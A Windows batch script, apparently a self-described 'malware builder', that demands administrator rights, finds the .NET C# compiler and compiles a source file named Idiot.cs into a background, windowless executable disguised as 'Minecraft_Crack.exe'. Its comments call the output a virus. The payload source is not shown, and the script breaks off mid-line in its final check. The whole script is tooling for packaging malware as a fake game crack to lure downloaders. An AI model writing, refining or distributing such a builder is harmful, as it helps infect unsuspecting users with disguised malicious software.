@echo off
color 0b
title MEMZ & MINECRAFT CRACK COMPILER
echo ========================================
echo   ULTIMATE MALWARE BUILDER v3.0
echo ========================================
echo.

:: 1. FORCE THE SCRIPT TO STAY IN ITS OWN FOLDER (Fix for lol-main)
cd /d "%~dp0"

:: 2. CHECK FOR ADMINISTRATOR PRIVILEGES
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] PLEASE RUN AS ADMINISTRATOR!
    echo Right-click this file and select 'Run as Administrator'.
    echo.
    pause
    exit
)

:: 3. SEARCH FOR SOURCE CODE
if not exist "Idiot.cs" (
    echo [ERROR] Idiot.cs NOT FOUND in this folder!
    echo Current Path: %cd%
    echo.
    dir /b
    pause
    exit
)

:: 4. LOCATE THE .NET COMPILER (CSC.EXE)
set "CSC64=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
set "CSC32=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"

if exist "%CSC64%" (
    set "CSC=%CSC64%"
) else if exist "%CSC32%" (
    set "CSC=%CSC32%"
) else (
    echo [ERROR] .NET Framework 4.0 or higher is not installed!
    pause
    exit
)

echo [SYSTEM] Compiler Found: %CSC%
echo [SYSTEM] Building: Idiot.cs...
echo.

:: 5. THE COMPILATION COMMAND
:: /target:winexe  - Makes it a background app (no console window)
:: /out:           - Sets the name of the finished virus
"%CSC%" /target:winexe /r:System.Windows.Forms.dll /r:System.Drawing.dll /out:"Minecraft_Crack.exe" "Idiot.cs"

:: 6. FINAL CHECK
if exist "Minecraft_Crack.exe" (
    echo.
    echo =
